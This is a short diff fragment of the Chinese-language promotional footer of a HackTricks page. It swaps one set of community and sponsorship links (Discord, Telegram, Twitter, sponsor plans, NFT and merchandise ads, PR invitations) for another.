-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass)，或在 **Twitter** 上 **关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**
+* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
